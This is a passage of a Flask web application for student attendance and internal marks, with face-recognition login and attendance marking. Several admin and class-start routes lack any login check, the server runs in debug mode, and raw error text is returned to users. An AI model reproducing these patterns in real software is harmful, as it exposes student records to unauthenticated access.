    subject_rows = execute_select("SELECT DISTINCT subject FROM tbltimetable WHERE faculty_id = %s", (faculty_id,))
    subjects = [row[0] for row in subject_rows]

    selected_subject = request.form.get('subject')
    start_date = request.form.get('start_date')
    end_date = request.form.get('end_date')

    if not start_date:
        start_date = datetime.today().strftime('%Y-%m-%d')
    if not end_date:
        end_date = datetime.today().strftime('%Y-%m-%d')

    attendance_data = []
    if selected_subject:
        attendance_data = get_attendance_report(selected_subject, start_date, end_date)

    return render_template('faculty/faculty_stud_attendance_report.html',
                           subjects=subjects,
                           selected_subject=selected_subject,
                           start_date=start_date,
                           end_date=end_date,
                           attendance_data=attendance_data)


def get_attendance_report(subject, start_date, end_date):
    """
    Returns a list of tuples:
    (student_id, student_name, present_count, absent_count)
    """
    query = """
        SELECT 
            a.sid AS student_id,
            s.name AS student_name,
            COUNT(CASE WHEN a.status = 'present' THEN 1 END) AS present_count,
            COUNT(CASE WHEN a.status = 'absent' THEN 1 END) AS absent_count
        FROM tblattendance a
        JOIN tblstudents s ON a.sid = s.sid
        WHERE a.subject = %s
        AND a.date BETWEEN %s AND %s
        GROUP BY a.sid, s.name
        ORDER BY s.name;
    """
    params = (subject, start_date, end_date)
    return execute_select(query, params)





@app.route('/admininternalreport', methods=['GET'])
def admininternalreport():
    if 'user_id' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('admin'))

    # No faculty filter — get all courses
    courses = execute_select("SELECT DISTINCT course FROM tblstudents")
    courses = [c[0] for c in courses]

    selected_course = request.args.get('course')
    selected_sem = request.args.get('sem')
    selected_subject = request.args.get('subject')

    unique_sems, subjects, students, marks_data = [], [], [], []

    if selected_course:
        unique_sems = execute_select(
            "SELECT DISTINCT sem FROM tblstudents WHERE course = %s",
            (selected_course,)
        )

    if selected_course and selected_sem:
        subjects = execute_select(
            "SELECT DISTINCT subject FROM tblfacultysubject WHERE course = %s AND sem = %s",
            (selected_course, selected_sem)
        )

    if selected_course and selected_sem and selected_subject:
        students = execute_select(
            "SELECT sid, name FROM tblstudents WHERE course = %s AND sem = %s",
            (selected_course, selected_sem)
        )
        marks_data = execute_select("""
            SELECT student_id, internal_exam, marks 
            FROM tblinternalmarks 
            WHERE course = %s AND sem = %s AND subject = %s
        """, (selected_course, selected_sem, selected_subject))

    return render_template(
        'admin/admininternalreport.html',
        courses=courses,
        unique_sems=unique_sems,
        subjects=subjects,
        students=students,
        marks_data=marks_data,
        selected_course=selected_course,
        selected_sem=selected_sem,
        selected_subject=selected_subject,
        email=session.get('email')
    )



@app.route('/admin_attendance_report', methods=['GET', 'POST'])
def admin_attendance_report():

    # Get all subjects taught by the faculty
    subjects = execute_select("SELECT DISTINCT subject FROM tbltimetable")
    subjects = [subject[0] for subject in subjects]  # Extract the subject names from the query result

    # Handle the form submission for subject and date
    if request.method == 'POST':
        selected_subject = request.form.get('subject')
        selected_date = request.form.get('date')

        # Query attendance for the selected subject and date
        attendance_records = execute_select("""
            SELECT a.sid, a.status, s.name
            FROM tblattendance a
            JOIN tblstudents s ON a.sid = s.sid
            WHERE a.subject = %s AND a.date = %s
            ORDER BY s.name
        """, (selected_subject, selected_date))

        # Render the template with attendance records
        return render_template('admin/admin_attendance_report.html', 
                               subjects=subjects, 
                               selected_subject=selected_subject, 
                               selected_date=selected_date,
                               attendance_records=attendance_records)

    # If the method is GET, just render the form without filtering
    return render_template('admin/admin_attendance_report.html', subjects=subjects)




@app.route('/admin_final_attendance_report', methods=['GET', 'POST'])
def admin_final_attendance_report():

    # Get list of subjects taught by faculty
    subject_rows = execute_select("SELECT DISTINCT subject FROM tbltimetable")
    subjects = [row[0] for row in subject_rows]

    selected_subject = request.form.get('subject')
    start_date = request.form.get('start_date')
    end_date = request.form.get('end_date')

    if not start_date:
        start_date = datetime.today().strftime('%Y-%m-%d')
    if not end_date:
        end_date = datetime.today().strftime('%Y-%m-%d')

    attendance_data = []
    if selected_subject:
        attendance_data = get_attendance_report(selected_subject, start_date, end_date)

    return render_template('admin/admin_final_attendance_report.html',
                           subjects=subjects,
                           selected_subject=selected_subject,
                           start_date=start_date,
                           end_date=end_date,
                           attendance_data=attendance_data)


def get_attendance_report(subject, start_date, end_date):
    """
    Returns a list of tuples:
    (student_id, student_name, present_count, absent_count)
    """
    query = """
        SELECT 
            a.sid AS student_id,
            s.name AS student_name,
            COUNT(CASE WHEN a.status = 'present' THEN 1 END) AS present_count,
            COUNT(CASE WHEN a.status = 'absent' THEN 1 END) AS absent_count
        FROM tblattendance a
        JOIN tblstudents s ON a.sid = s.sid
        WHERE a.subject = %s
        AND a.date BETWEEN %s AND %s
        GROUP BY a.sid, s.name
        ORDER BY s.name;
    """
    params = (subject, start_date, end_date)
    return execute_select(query, params)




@app.route('/student')
def student():
    return render_template('student.html')

@app.route("/student_login", methods=["GET", "POST"])
def student_login():
    if request.method == "POST":
        email = request.form.get('email')
        password = request.form.get('password')

        query = "SELECT * FROM tblstudents WHERE emailid = %s"
        result = check_student_login(query, email, password)

        if result == "success":
            flash("Login successful!", "success")
            return redirect(url_for('studenthome'))
        elif result == "not_found":
            flash("User not found.", "danger")
        elif result == "invalid_password":
            flash("Invalid credentials. Please try again.", "danger")

        return redirect(url_for('student_login'))

    return render_template("student.html")



@app.route('/face_student_login', methods=['POST'])
def face_student_login():
    try:
        # Load student face encodings and sids
        with open('student_face_recognition_model.pkl', 'rb') as f:
            known_encodings, known_sids = pickle.load(f)

        # Decode image
        data = request.json['image_data']
        _, encoded = data.split(',', 1)
        img_bytes = base64.b64decode(encoded)
        np_arr = np.frombuffer(img_bytes, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
        rgb_img = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

        # Detect face(s)
        face_locations = face_recognition.face_locations(rgb_img)
        face_encodings = face_recognition.face_encodings(rgb_img, face_locations)

        if not face_encodings:
            return jsonify({"status": "error", "message": "No face detected"})

        # Match detected face with known encodings
        for encoding in face_encodings:
            distances = face_recognition.face_distance(known_encodings, encoding)
            min_distance = min(distances)
            best_match_index = distances.tolist().index(min_distance)

            if min_distance < 0.45:
                sid = known_sids[best_match_index]

                # Fetch student name
                result = execute_select("SELECT name FROM tblstudents WHERE sid = %s", (sid,))
                name = result[0][0] if result else sid

                # Save to session
                session['sid'] = sid
                session['name'] = name

                return jsonify({
                    "status": "success",
                    "message": f"Welcome {name}",
                    "sid": sid
                })
            else:
                return jsonify({"status": "error", "message": "Face not recognized"})

        return jsonify({"status": "error", "message": "No matching face found"})

    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"})



@app.route('/studenthome')
def studenthome():
    if 'name' not in session or 'sid' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('student_login'))

    name = session['name']
    sid = session['sid']

    # Fetch student details (course, sem)
    student_info = execute_select("SELECT course, sem FROM tblstudents WHERE sid = %s", (sid,))
    course, sem = student_info[0] if student_info else (None, None)

    # 1. Total Subjects assigned to this Course/Sem
    subjects_count = execute_select("SELECT COUNT(*) FROM tblsubject WHERE course = %s AND sem = %s", (course, sem))
    total_subjects = subjects_count[0][0] if subjects_count else 0

    # 2. Attendance Statistics
    attendance_stats = execute_select("""
        SELECT 
            COUNT(CASE WHEN status = 'present' THEN 1 END) as present,
            COUNT(*) as total
        FROM tblattendance 
        WHERE sid = %s
    """, (sid,))
    present_days, total_days = attendance_stats[0] if attendance_stats else (0, 0)
    attendance_pct = (present_days / total_days * 100) if total_days > 0 else 0

    # 3. Total Internal Marks Records
    internal_res = execute_select("SELECT COUNT(*) FROM tblinternalmarks WHERE student_id = %s", (sid,))
    total_internals = internal_res[0][0] if internal_res else 0

    stats = {
        'total_subjects': total_subjects,
        'attendance_pct': round(attendance_pct, 1),
        'total_internals': total_internals,
        'course': course,
        'sem': sem
    }

    return render_template('student/studenthome.html', name=name, sid=sid, stats=stats)


@app.route('/studentinternalreport', methods=['GET'])
def studentinternalreport():
    student_id = session.get('sid')
    if not student_id:
        return redirect(url_for('studentlogin'))

    # Get filters from query parameters
    selected_subject = request.args.get('subject')
    selected_exam_type = request.args.get('exam_type')

    # Build base query
    query = """
        SELECT subject, internal_exam, marks, total_marks, faculty
        FROM tblinternalmarks
        WHERE student_id = %s
    """
    params = [student_id]

    if selected_subject:
        query += " AND subject = %s"
        params.append(selected_subject)
    if selected_exam_type:
        query += " AND internal_exam = %s"
        params.append(selected_exam_type)

    internal_marks = execute_select(query, tuple(params))

    # For dropdowns: get unique subjects and exam types for the student
    subjects = [row[0] for row in execute_select(
        "SELECT DISTINCT subject FROM tblinternalmarks WHERE student_id = %s", (student_id,)
    )]

    exam_types = [row[0] for row in execute_select(
        "SELECT DISTINCT internal_exam FROM tblinternalmarks WHERE student_id = %s", (student_id,)
    )]

    return render_template(
        'student/studentinternalreport.html',
        internal_marks=internal_marks,
        subjects=subjects,
        exam_types=exam_types,
        selected_subject=selected_subject,
        selected_exam_type=selected_exam_type
    )




@app.route('/studentlogout', methods=['POST'])
def studentlogout():
    session.clear()
    flash("Logged out successfully.", "info")
    return redirect(url_for('student'))











@app.route('/meet')
def meet():
    return render_template('meet.html')










@app.route('/mark_attendance', methods=['GET', 'POST'])
def mark_attendance():
    if request.method == 'GET':
        return render_template('attendance.html')  # Renders the face capture page

    try:
        # Load known face encodings and student IDs
        with open('student_face_recognition_model.pkl', 'rb') as f:
            known_encodings, known_sids = pickle.load(f)

        print(known_sids)

        # Decode the image from the request
        data = request.get_json(force=True)
        image_data = data.get('image_data')
        if not image_data:
            return jsonify({"status": "error", "message": "No image data found"})

        _, encoded = image_data.split(',', 1)
        img_bytes = base64.b64decode(encoded)
        np_arr = np.frombuffer(img_bytes, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
        rgb_img = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

        # Detect face
        face_locations = face_recognition.face_locations(rgb_img)
        face_encodings = face_recognition.face_encodings(rgb_img, face_locations)

        if not face_encodings:
            return jsonify({"status": "error", "message": "No face detected"})

        # Match the face
        for encoding in face_encodings:
            distances = face_recognition.face_distance(known_encodings, encoding)
            min_distance = min(distances)
            best_match_index = distances.tolist().index(min_distance)

            if min_distance < 0.45:
                sid = known_sids[best_match_index]

                # Get course and semester for student
                student = execute_select("SELECT course, sem FROM tblstudents WHERE sid = %s", (sid,))
                if not student:
                    return jsonify({"status": "error", "message": "Student not found"})
                course, sem = student[0]

                # Determine the current time & day
                now = datetime.now()
                current_day = now.strftime('%A')
                current_time = now.strftime('%H:%M:%S')

                # Find the current subject from timetable
                timetable = execute_select(""" 
                    SELECT subject, faculty_id, start_time, end_time, day_of_week 
                    FROM tbltimetable 
                    WHERE course = %s AND sem = %s 
                    AND day_of_week = %s 
                    AND start_time <= %s AND end_time >= %s
                """, (course, sem, current_day, current_time, current_time))

                if not timetable:
                    return jsonify({"status": "info", "message": "No class scheduled right now"})

                subject, faculty_id, start_time, end_time, day_of_week = timetable[0]

                # Update status from 'absent' to 'present' if record exists
                update_result = execute_update(""" 
                    UPDATE tblattendance 
                    SET status = 'present' 
                    WHERE sid = %s AND subject = %s AND date = CURDATE()
                """, (sid, subject))

                if update_result == 0:
                    return jsonify({"status": "error", "message": "Attendance record not found to update"})

                return jsonify({
                    "status": "success",
                    "message": f"Attendance marked as present for {sid} in {subject}",
                    "sid": sid,
                    "subject": subject
                })

            else:
                return jsonify({"status": "error", "message": "Face not recognized"})

        return jsonify({"status": "error", "message": "No matching face found"})

    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"}), 400





def mark_all_students_absent_for_today():
    today = datetime.now().strftime('%A')  # e.g., 'Monday'

    # Get today's timetable entries
    classes_today = execute_select("""
        SELECT course, sem, subject, faculty_id, start_time, end_time, day_of_week
        FROM tbltimetable
        WHERE day_of_week = %s
    """, (today,))

    for course, sem, subject, faculty_id, start_time, end_time, day_of_week in classes_today:
        # Get all students for that course and semester
        students = execute_select("""
            SELECT sid FROM tblstudents WHERE course = %s AND sem = %s
        """, (course, sem))

        # For each student, check if already inserted
        for (sid,) in students:
            already_inserted = execute_select("""
                SELECT id FROM tblattendance 
                WHERE sid = %s AND subject = %s AND date = CURDATE()
            """, (sid, subject))

            if not already_inserted:
                # Insert as 'absent'
                execute_insert("""
                    INSERT INTO tblattendance 
                    (sid, date, time, subject, faculty_id, start_time, end_time, day_of_week, status)
                    VALUES (%s, CURDATE(), CURTIME(), %s, %s, %s, %s, %s, 'absent')
                """, (sid, subject, faculty_id, start_time, end_time, day_of_week))


@app.route('/start_classes', methods=['POST'])
def start_classes():
    try:
        mark_all_students_absent_for_today()  # Your existing function
        return jsonify({'status': 'success', 'message': 'Attendance initialized for today\'s classes.'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'}), 500



@app.route('/student_attendance', methods=['GET'])
def student_attendance():
    # Get current student's sid from session (or however you store it)
    sid = session.get('sid')

    # Get selected subject from filter
    selected_subject = request.args.get('subject')

    # Get list of all subjects the student has attendance records for
    subjects = execute_select("SELECT DISTINCT subject FROM tblattendance WHERE sid = %s", (sid,))

    # Query attendance records based on filter
    if selected_subject:
        attendance_records = execute_select("""SELECT date, time, subject, status, faculty_id 
                                                FROM tblattendance 
                                                WHERE sid = %s AND subject = %s 
                                                ORDER BY date DESC""", (sid, selected_subject))
    else:
        attendance_records = execute_select("""SELECT date, time, subject, status, faculty_id 
                                                FROM tblattendance 
                                                WHERE sid = %s 
                                                ORDER BY date DESC""", (sid,))

    return render_template('student/student_attendance.html', 
                           subjects=subjects, 
                           selected_subject=selected_subject, 
                           attendance_records=attendance_records)





if __name__ == '__main__':
    serverCheck()
    app.run(debug=True)
